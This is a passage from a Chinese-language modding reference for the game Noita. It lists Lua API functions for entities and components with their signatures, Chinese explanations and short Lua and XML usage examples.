)</p></blockquote><p>设置实体状态，id，坐标，贴图顺时针选择弧度，贴图缩放，-1翻转</p><h3 id="EntityApplyTransform"><a href="#EntityApplyTransform" class="headerlink" title="EntityApplyTransform"></a><code>EntityApplyTransform</code></h3><blockquote><p>EntityApplyTransform( entity_id:int, x:number, y:number = 0, rotation:number = 0, scale_x:number = 1, scale_y:number = 1 )  [Sets the transform and tries to immediately refresh components that calculate values based on an entity’s transform.]</p></blockquote><p>用法同上，立即更新依赖组件</p><h3 id="EntityGetName"><a href="#EntityGetName" class="headerlink" title="EntityGetName"></a><code>EntityGetName</code></h3><blockquote><p>EntityGetName( entity_id:int ) -&gt; name:string</p></blockquote><p>输入id，返回name（字符串）</p><h3 id="EntitySetName"><a href="#EntitySetName" class="headerlink" title="EntitySetName"></a><code>EntitySetName</code></h3><blockquote><p>EntitySetName( entity_id:int, name:string )</p></blockquote><p>输入id和name，无返回值</p><h3 id="EntityGetTags"><a href="#EntityGetTags" class="headerlink" title="EntityGetTags"></a><code>EntityGetTags</code></h3><blockquote><p>EntityGetTags( entity_id:int ) -&gt; string|nil [Returns a string where the tags are comma-separated, or nil if ‘entity_id’ doesn’t point to a valid entity.]</p></blockquote><p>输入id，返回标签（一个字符串）。备注说返回的标签以字符串分割，id无效返回nil</p><h3 id="EntityAddTag"><a href="#EntityAddTag" class="headerlink" title="EntityAddTag"></a><code>EntityAddTag</code></h3><blockquote><p>EntityAddTag( entity_id:int, tag:string )</p></blockquote><p>输入实体id，字符串，追加到原有标签末尾</p><h3 id="EntityRemoveTag"><a href="#EntityRemoveTag" class="headerlink" title="EntityRemoveTag"></a><code>EntityRemoveTag</code></h3><blockquote><p>EntityRemoveTag( entity_id:int, tag:string )</p></blockquote><p>移除标签，输入实体id，待移除的标签名</p><h3 id="EntityHasTag"><a href="#EntityHasTag" class="headerlink" title="EntityHasTag"></a><code>EntityHasTag</code></h3><blockquote><p>EntityHasTag( entity_id:int, tag:string ) -&gt; bool</p></blockquote><p>判断实体是否具有标签，返回一个bool值</p><h3 id="EntityGetFilename"><a href="#EntityGetFilename" class="headerlink" title="EntityGetFilename"></a><code>EntityGetFilename</code></h3><blockquote><p>EntityGetFilename( entity_id:int ) -&gt; full_path:string [Return value example: ‘data/entities/items/flute.xml’. Incorrect value is returned if the entity has passed through the world streaming system.]</p></blockquote><p>输入id，返回一个文件路径名</p><h3 id="EntitiesGetMaxID"><a href="#EntitiesGetMaxID" class="headerlink" title="EntitiesGetMaxID"></a><code>EntitiesGetMaxID</code></h3><blockquote><p>EntitiesGetMaxID() -&gt; entity_max_id:number [Returns the max entity ID currently in use. Entity IDs are increased linearly. ]</p></blockquote><p>无参数，返回在用的最大id</p><h3 id="EntityGetIsAlive"><a href="#EntityGetIsAlive" class="headerlink" title="EntityGetIsAlive"></a><code>EntityGetIsAlive</code></h3><blockquote><p>EntityGetIsAlive( entity_id:int ) -&gt; bool</p></blockquote><p>输入实体id，返回bool值，是否活着</p><h3 id="EntityAddComponent"><a href="#EntityAddComponent" class="headerlink" title="EntityAddComponent"></a><code>EntityAddComponent</code></h3><blockquote><p>EntityAddComponent( entity_id:int, component_type_name:string, table_of_component_values:{string} = nil ) -&gt; component_id:int</p></blockquote><p>为实体增加组件，输入实体id，组件名，一个该组件的属性表（键值对），返回组件id（唯一地标识该实体的改组件）</p><p>使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityAddComponent</span><span class="token punctuation">(</span> projectile_id<span class="token punctuation">,</span> <span class="token string">"HomingComponent"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> target_tag <span class="token operator">=</span> <span class="token string">"projectile_commander"</span><span class="token punctuation">,</span>homing_targeting_coeff <span class="token operator">=</span> <span class="token string">"200"</span><span class="token punctuation">,</span>homing_velocity_multiplier <span class="token operator">=</span> <span class="token string">"1.0"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="EntityAddComponent2"><a href="#EntityAddComponent2" class="headerlink" title="EntityAddComponent2"></a><code>EntityAddComponent2</code></h3><blockquote><p>EntityAddComponent2( entity_id:int, component_type_name, table_of_component_values:{string-multiple_types} = nil ) -&gt; component_id [Creates a component of type ‘component_type_name’ and adds it to ‘entity_id’. ‘table_of_component_values’ should be a string-indexed table, where keys are field names and values are field values of correct type. The value setting works like ComponentObjectSetValue2(), with the exception that multivalue types are not supported. Additional supported values are _tags:comma_separated_string and _enabled:bool, which basically work like the those fields work in entity XML files. Returns the created component, if creation succeeded, or nil.</p></blockquote><p>参数与返回值同上，nolla备注说：创造一个组件并加到实体上，组件值表应该是一个键值对表，键是字段名，值是正确的类型。这个值设置运行就像ComponentObjectSetValue2()一样，除了不支持多种值类型。额外支持的值有_tags:comma_separated_string和 _enabled:bool，和其他xml文件里对应的字段效果一样</p><p>并没有解释和EntityAddComponent相比有什么区别，使用示例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityAddComponent2</span><span class="token punctuation">(</span> text_id<span class="token punctuation">,</span> <span class="token string">"SpriteComponent"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>image_file<span class="token operator">=</span><span class="token string">"data/fonts/font_pixel_white.xml"</span><span class="token punctuation">,</span>is_text_sprite<span class="token operator">=</span><span class="token keyword">true</span><span class="token punctuation">,</span>offset_x<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>offset_y<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>text <span class="token operator">=</span> text<span class="token punctuation">,</span> update_transform<span class="token operator">=</span><span class="token keyword">true</span><span class="token punctuation">,</span>update_transform_rotation<span class="token operator">=</span><span class="token keyword">false</span><span class="token punctuation">,</span>has_special_scale<span class="token operator">=</span><span class="token keyword">true</span><span class="token punctuation">,</span>special_scale_x<span class="token operator">=</span><span class="token number">0.65</span><span class="token punctuation">,</span>special_scale_y<span class="token operator">=</span><span class="token number">0.65</span><span class="token punctuation">,</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="EntityRemoveComponent"><a href="#EntityRemoveComponent" class="headerlink" title="EntityRemoveComponent"></a><code>EntityRemoveComponent</code></h3><blockquote><p>EntityRemoveComponent( entity_id:int, component_id:int )</p></blockquote><p>移除组件，输入实体id和组件id，无返回</p><h3 id="EntityGetAllComponents"><a href="#EntityGetAllComponents" class="headerlink" title="EntityGetAllComponents"></a><code>EntityGetAllComponents</code></h3><blockquote><p>EntityGetAllComponents( entity_id:int ) -&gt; {int} [Returns a table of component ids.]</p></blockquote><p>获取实体的全部组件，输入实体id返回一个组件id表</p><p>使用示例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">-- hamis here is a entity_id</span><span class="token keyword">for</span> _<span class="token punctuation">,</span>comp <span class="token keyword">in</span> <span class="token function">pairs</span><span class="token punctuation">(</span><span class="token function">EntityGetAllComponents</span><span class="token punctuation">(</span>hamis<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">do</span>     <span class="token function">GamePrint</span><span class="token punctuation">(</span>comp<span class="token punctuation">)</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="EntityGetComponent"><a href="#EntityGetComponent" class="headerlink" title="EntityGetComponent"></a><code>EntityGetComponent</code></h3><blockquote><p>EntityGetComponent( entity_id:int, component_type_name:string, tag:string = “” ) -&gt; {component_id}|nil</p></blockquote><p>获取特定组件，输入实体id，组件名，标签（可省略），返回一个组件id表</p><h3 id="EntityGetFirstComponent"><a href="#EntityGetFirstComponent" class="headerlink" title="EntityGetFirstComponent"></a><code>EntityGetFirstComponent</code></h3><blockquote><p>EntityGetFirstComponent( entity_id:int, component_type_name:string, tag:string = “” ) -&gt; component_id|nil</p></blockquote><p>获取第一个组件，输入实体id，组件名，标签（可省略），返回一个组件id</p><h3 id="EntityGetComponentIncludingDisabled"><a href="#EntityGetComponentIncludingDisabled" class="headerlink" title="EntityGetComponentIncludingDisabled"></a><code>EntityGetComponentIncludingDisabled</code></h3><blockquote><p>EntityGetComponentIncludingDisabled( entity_id:int, component_type_name:string, tag:string = “” ) -&gt; {component_id}|nil</p></blockquote><p>获取包含禁用的组件，输入实体id，组件名，标签（可省略），返回一个组件id表</p><h3 id="EntityGetFirstComponentIncludingDisabled"><a href="#EntityGetFirstComponentIncludingDisabled" class="headerlink" title="EntityGetFirstComponentIncludingDisabled"></a><code>EntityGetFirstComponentIncludingDisabled</code></h3><blockquote><p>EntityGetFirstComponentIncludingDisabled( entity_id:int, component_type_name:string, tag:string = “” ) -&gt; component_id|nil</p></blockquote><p>获取包含禁用的组件中的第一个，输入实体id，组件名，标签（可省略），返回一个组件id，参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> celleater <span class="token operator">=</span> <span class="token function">EntityGetFirstComponent</span><span class="token punctuation">(</span> <span class="token function">GetUpdatedEntityID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"CellEaterComponent"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="EntitySetComponentIsEnabled"><a href="#EntitySetComponentIsEnabled" class="headerlink" title="EntitySetComponentIsEnabled"></a><code>EntitySetComponentIsEnabled</code></h3><blockquote><p>EntitySetComponentIsEnabled( entity_id:int, component_id:int, is_enabled:bool )</p></blockquote><p>启用/禁用组件，输入实体id，组件id，和一个布尔值（启用/禁用）</p><h3 id="EntitySetComponentsWithTagEnabled"><a href="#EntitySetComponentsWithTagEnabled" class="headerlink" title="EntitySetComponentsWithTagEnabled"></a><code>EntitySetComponentsWithTagEnabled</code></h3><blockquote><p>EntitySetComponentsWithTagEnabled( entity_id:int, tag:string, enabled:bool )</p></blockquote><p>批量启用/禁用带特定标签的组件，输入实体id，标签名，启用/禁用</p><h3 id="EntityAddChild"><a href="#EntityAddChild" class="headerlink" title="EntityAddChild"></a><code>EntityAddChild</code></h3><blockquote><p>EntityAddChild( parent_id:int, child_id:int )</p></blockquote><p>给实体增加一个子实体，参数前父后子。</p><p>一个实体的构成除了组件以外还可以有别的实体，即子实体。大部分的天赋都是以这种形式添加的</p><h3 id="EntityGetAllChildren"><a href="#EntityGetAllChildren" class="headerlink" title="EntityGetAllChildren"></a><code>EntityGetAllChildren</code></h3><blockquote><p>EntityGetAllChildren( entity_id:int, tag:string = “” ) -&gt; {entity_id:int}|nil [If passed the optional ‘tag’ parameter, will return only child entities that have that tag (If ‘tag’ isn’t a valid tag name, will return no entities). If no entities are returned, might return either an empty table or nil.]</p></blockquote><p>查找指定实体的子实体，输入实体id、特定标签（可选，无则全部），返回一个实体id表或nil</p><h3 id="EntityGetParent"><a href="#EntityGetParent" class="headerlink" title="EntityGetParent"></a><code>EntityGetParent</code></h3><blockquote><p>EntityGetParent( entity_id:int ) -&gt; entity_id:int</p></blockquote><p>输入实体id，返回其父实体id</p><h3 id="EntityRemoveFromParent"><a href="#EntityRemoveFromParent" class="headerlink" title="EntityRemoveFromParent"></a><code>EntityRemoveFromParent</code></h3><blockquote><p>EntityRemoveFromParent( entity_id:int )</p></blockquote><p>输入实体id，从其父实体中移除</p><h3 id="EntityGetRootEntity"><a href="#EntityGetRootEntity" class="headerlink" title="EntityGetRootEntity"></a><code>EntityGetRootEntity</code></h3><blockquote><p>EntityGetRootEntity( entity_id:int ) -&gt; entity_id:int [Returns the given entity if it has no parent, otherwise walks up the parent hierarchy to the topmost parent and returns it.]</p></blockquote><p>获取根实体，输入id，返回最顶层的根实体id，如果没有根实体则返回自身</p><h3 id="EntityLoadToEntity"><a href="#EntityLoadToEntity" class="headerlink" title="EntityLoadToEntity"></a><code>EntityLoadToEntity</code></h3><blockquote><p>EntityLoadToEntity( filename:string, entity:int ) [Loads components from ‘filename’ to ‘entity’. Does not load tags and other stuff.]</p></blockquote><p>把一个文件的组件加载到一个实体上，不加载标签和其它，输入文件路径和实体id，例（念动力踢击天赋）：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityLoadToEntity</span><span class="token punctuation">(</span> <span class="token string">"data/entities/misc/perk_telekinesis.xml"</span><span class="token punctuation">,</span> entity_who_picked <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- data/entities/misc/perk_telekinesis.xml --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Entity</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TelekinesisComponent</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TelekinesisComponent</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AudioLoopComponent</span>    <span class="token attr-name">_tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sound_telekinesis_move<span class="token punctuation">"</span></span>    <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/audio/Desktop/misc.bank<span class="token punctuation">"</span></span>    <span class="token attr-name">event_name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>misc/telekinesis/object_move<span class="token punctuation">"</span></span>    <span class="token attr-name">volume_autofade_speed</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.05<span class="token punctuation">"</span></span>  <span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AudioLoopComponent</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AudioLoopComponent</span>    <span class="token attr-name">_tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sound_telekinesis_hold<span class="token punctuation">"</span></span>    <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/audio/Desktop/misc.bank<span class="token punctuation">"</span></span>    <span class="token attr-name">event_name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>misc/telekinesis/hold<span class="token punctuation">"</span></span>    <span class="token attr-name">volume_autofade_speed</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.05<span class="token punctuation">"</span></span>  <span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AudioLoopComponent</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Entity</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>随便替换组件会产生复杂的异常行为，有待进一步探索</p><h3 id="EntitySave"><a href="#EntitySave" class="headerlink" title="EntitySave"></a><code>EntitySave</code></h3><blockquote><p>EntitySave( entity_id:int, filename:string ) [Note: works only in dev builds.]</p></blockquote><p>保存实体为文件，输入实体id和保存到的文件路径，仅在开发者模式下可用，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">--direector_helpers_design.lua</span>entity_file <span class="token operator">=</span> <span class="token function">getPath</span><span class="token punctuation">(</span> entity_file <span class="token punctuation">)</span> <span class="token operator">..</span> biome <span class="token operator">..</span> <span class="token string">"/"</span> <span class="token operator">..</span> <span class="token function">getFilename</span><span class="token punctuation">(</span>entity_file<span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span> <span class="token string">"saving to"</span><span class="token punctuation">,</span> <span class="token function">getPath</span><span class="token punctuation">(</span> entity_file <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token function">EntitySave</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> entity_file  <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="组件Component……"><a href="#组件Component……" class="headerlink" title="组件Component……"></a>组件Component……</h2><p>（从实体获取组件信息见实体部分）</p><h3 id="ComponentGetValue2"><a href="#ComponentGetValue2" class="headerlink" title="ComponentGetValue2"></a><code>ComponentGetValue2</code></h3><blockquote><p>ComponentGetValue2( component_id:int, field_name:string ) -&gt; multiple_types|nil [Returns one or many values matching the type or subtypes of the requested field. Reports error and returns nil if the field type is not supported or field was not found. This is up to 7.5x faster than the old ComponentSetValue functions.]</p></blockquote><p>获取组件的字段的值，输入组件id和字段名，返回匹配的所有值/nil</p><h3 id="ComponentSetValue2"><a href="#ComponentSetValue2" class="headerlink" title="ComponentSetValue2"></a><code>ComponentSetValue2</code></h3><blockquote><p>ComponentSetValue2( component_id:int, field_name:string, value_or_values:multiple_types ) [Sets the value of a field. Value(s) should have a type matching the field type. Reports error if the values weren’t given in correct type, the field type is not supported, or the component does not exist. This is up to 20x faster than the old ComponentSetValue functions.]</p></blockquote><p>设置组件字段，输入组件id，字段名，值。</p><h3 id="ComponentObjectGetValue2"><a href="#ComponentObjectGetValue2" class="headerlink" title="ComponentObjectGetValue2"></a><code>ComponentObjectGetValue2</code></h3><blockquote><p>ComponentObjectGetValue2( component_id:int, object_name:string, field_name:string ) -&gt; multiple types|nil [Returns one or many values matching the type or subtypes of the requested field in a component subobject. Reports error and returns nil if the field type is not supported or ‘object_name’ is not a metaobject.]</p></blockquote><p>获取object的值，输入组件id，对象名，字段名，返回值</p><p>一个组件的属性可能是标签，比如：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DamageModelComponent</span> <span class="token attr-name">hp</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token attr-name">max_hp</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token attr-name">materials_create_messages</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token attr-name">ragdoll_filenames_file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">fire_probability_of_ignition</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token attr-name">ragdoll_fx_forced</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DISINTEGRATED<span class="token punctuation">"</span></span><span class="token attr-name">ragdoll_material</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rock_static_glow<span class="token punctuation">"</span></span><span class="token attr-name">minimum_knockback_force</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span><span class="token attr-name">materials_that_damage</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">materials_how_much_damage</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>damage_multipliers</span><span class="token attr-name">melee</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.3<span class="token punctuation">"</span></span><span class="token attr-name">projectile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.5<span class="token punctuation">"</span></span><span class="token attr-name">explosion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token attr-name">electricity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token attr-name">ice</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token attr-name">fire</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.1<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>damage_multipliers</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DamageModelComponent</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>获取深层标签(damage_multipliers)的值就可以用如下的方法：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> fire_damage <span class="token operator">=</span> <span class="token function">ComponentObjectGetValue2</span><span class="token punctuation">(</span>comp_id<span class="token punctuation">,</span> <span class="token string">"damage_multipliers"</span><span class="token punctuation">,</span> <span class="token string">"fire"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="ComponentObjectSetValue2"><a href="#ComponentObjectSetValue2" class="headerlink" title="ComponentObjectSetValue2"></a><code>ComponentObjectSetValue2</code></h3><blockquote><p>ComponentObjectSetValue2( component_id:int, object_name:string, field_name:string, value_or_values:multiple_types ) [Sets the value of a field in a component subobject. Value(s) should have a type matching the field type. Reports error if the values weren’t given in correct type, the field type is not supported or ‘object_name’ is not a metaobject.]</p></blockquote><p>输入组件id，对象名，字段名，值，例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">ComponentObjectSetValue2</span><span class="token punctuation">(</span>damagemodel_comp<span class="token punctuation">,</span> <span class="token string">"damage_multipliers"</span><span class="token punctuation">,</span> <span class="token string">"melee"</span><span class="token punctuation">,</span> <span class="token number">1.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="ComponentAddTag"><a href="#ComponentAddTag" class="headerlink" title="ComponentAddTag"></a><code>ComponentAddTag</code></h3><blockquote><p>ComponentAddTag( component_id:int, tag:string )</p></blockquote><p>给组件加标签，输入组件id和标签名，无返回值</p><h3 id="ComponentRemoveTag"><a href="#ComponentRemoveTag" class="headerlink" title="ComponentRemoveTag"></a><code>ComponentRemoveTag</code></h3><blockquote><p>ComponentRemoveTag( component_id:int, tag:string )</p></blockquote><p>移除组件标签，输入组件id和标签名，无返回值</p><h3 id="ComponentGetTags"><a href="#ComponentGetTags" class="headerlink" title="ComponentGetTags"></a><code>ComponentGetTags</code></h3><blockquote><p>ComponentGetTags( component_id:int ) -&gt; string|nil [Returns a string where the tags are comma-separated, or nil if can’t find ‘component_id’ component.]</p></blockquote><p>输入组件id，返回用逗号分隔的一整个标签字符串，组件id不存在时返回nil</p><h3 id="ComponentHasTag"><a href="#ComponentHasTag" class="headerlink" title="ComponentHasTag"></a><code>ComponentHasTag</code></h3><blockquote><p>ComponentHasTag( component_id:int, tag:string ) -&gt; bool</p></blockquote><p>组件是否具有标签，输入组件id和标签名，返回一个bool值</p><h3 id="ComponentGetIsEnabled"><a href="#ComponentGetIsEnabled" class="headerlink" title="ComponentGetIsEnabled"></a><code>ComponentGetIsEnabled</code></h3><blockquote><p>ComponentGetIsEnabled( component_id:int ) -&gt; bool [Returns true if the given component exists and is enabled, else false.]</p></blockquote><p>获取组件是否可用，输入组件id返回bool值。</p><p>注：设置组件禁用与否用EntitySetComponentIsEnabled和EntitySetComponentsWithTagEnabled</p><h3 id="ComponentGetEntity"><a href="#ComponentGetEntity" class="headerlink" title="ComponentGetEntity"></a><code>ComponentGetEntity</code></h3><blockquote><p>ComponentGetEntity( component_id:int ) -&gt; entity_id:int [Returns the id of the entity that owns a component, or 0.]</p></blockquote><p>获取拥有特定组件的实体，输入组件id返回实体id，没有则为0</p><h3 id="ComponentGetMembers"><a href="#ComponentGetMembers" class="headerlink" title="ComponentGetMembers"></a><code>ComponentGetMembers</code></h3><blockquote><p>ComponentGetMembers( component_id:int ) -&gt; {string-string}|nil [Returns a string-indexed table of string.]</p></blockquote><p>输入组件id，返回一个字符串-索引的表，似乎包括保持默认的字段</p><h3 id="ComponentObjectGetMembers"><a href="#ComponentObjectGetMembers" class="headerlink" title="ComponentObjectGetMembers"></a><code>ComponentObjectGetMembers</code></h3><blockquote><p>ComponentObjectGetMembers( component_id:int, object_name:string ) -&gt; {string-string}|nil [Returns a string-indexed table of string or nil.]</p></blockquote><p>输入组件id和object名，返回一个字符串-索引的表</p><h3 id="ComponentGetTypeName"><a href="#ComponentGetTypeName" class="headerlink" title="ComponentGetTypeName"></a><code>ComponentGetTypeName</code></h3><blockquote><p>ComponentGetTypeName( component_id:int ) -&gt; string</p></blockquote><p>输入组件id，返回组件名（如：AnimalAIComponent）</p><h2 id="其它实体-组件相关"><a href="#其它实体-组件相关" class="headerlink" title="其它实体/组件相关"></a>其它实体/组件相关</h2><h3 id="GetUpdatedEntityID"><a href="#GetUpdatedEntityID" class="headerlink" title="GetUpdatedEntityID"></a><code>GetUpdatedEntityID</code></h3><blockquote><p>GetUpdatedEntityID() -&gt; entity_id:int</p></blockquote><p>获取更新的实体id，一个非常常用的api，用于获取一个目标</p><h3 id="GetUpdatedComponentID"><a href="#GetUpdatedComponentID" class="headerlink" title="GetUpdatedComponentID"></a><code>GetUpdatedComponentID</code></h3><blockquote><p>GetUpdatedComponentID() -&gt; component_id:int</p></blockquote><p>获取更新的组件id</p><h3 id="EntityInflictDamage"><a href="#EntityInflictDamage" class="headerlink" title="EntityInflictDamage"></a><code>EntityInflictDamage</code></h3><blockquote><p>EntityInflictDamage( entity:int, amount:number, damage_type:string, description:string, ragdoll_fx:string, impulse_x:number, impulse_y:number, entity_who_is_responsible:int = 0, world_pos_x:number = entity_x, world_pos_y:number = entity_y, knockback_force:number = 0 )</p></blockquote><p>给实体施加一个伤害，输入实体id，伤害数值（有一个系数），伤害类型，描述（随意填写），使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityInflictDamage</span><span class="token punctuation">(</span> v<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"DAMAGE_CURSE"</span><span class="token punctuation">,</span> <span class="token string">"$damage_supernova"</span><span class="token punctuation">,</span> <span class="token string">"DISINTEGRATED"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> entity_id <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityInflictDamage</span><span class="token punctuation">(</span>controlled_entity<span class="token punctuation">,</span> <span class="token number">2000000</span><span class="token punctuation">,</span> <span class="token string">"DAMAGE_CURSE"</span><span class="token punctuation">,</span> <span class="token string">"something"</span><span class="token punctuation">,</span> <span class="token string">"NONE"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">GameGetWorldStateEntity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="EntityIngestMaterial"><a href="#EntityIngestMaterial" class="headerlink" title="EntityIngestMaterial"></a><code>EntityIngestMaterial</code></h3><blockquote><p>EntityIngestMaterial( entity:int, material_type:number, amount:number ) [Has the same effects that would occur if ‘entity’ eats ‘amount’ number of cells of ‘material_type’ from the game world. Use this instead of directly modifying IngestionComponent values, if possible. Might not work with non-player entities. Use CellFactory_GetType() to convert a material name to material type.]</p></blockquote><p>实体摄入材料，输入实体id，材料种类（数字），数量。和实体在游戏世界里吃下amount像素的材料有同样的效果。尽可能用这个函数而不是直接修改IngestionComponent组件的字段。可能对非玩家实体不生效。用CellFactory_GetType()去把材料名转化成需要的id数字，参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityIngestMaterial</span><span class="token punctuation">(</span> entity_id<span class="token punctuation">,</span> <span class="token function">CellFactory_GetType</span><span class="token punctuation">(</span><span class="token string">"fungi"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="EntityRemoveIngestionStatusEffect"><a href="#EntityRemoveIngestionStatusEffect" class="headerlink" title="EntityRemoveIngestionStatusEffect"></a><code>EntityRemoveIngestionStatusEffect</code></h3><blockquote><p>EntityRemoveIngestionStatusEffect( entity:int, status_type_id:string )</p></blockquote><p>移除实体的摄入效果，输入实体id，状态名，参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityRemoveIngestionStatusEffect</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>my_player<span class="token punctuation">.</span>entity<span class="token punctuation">,</span> <span 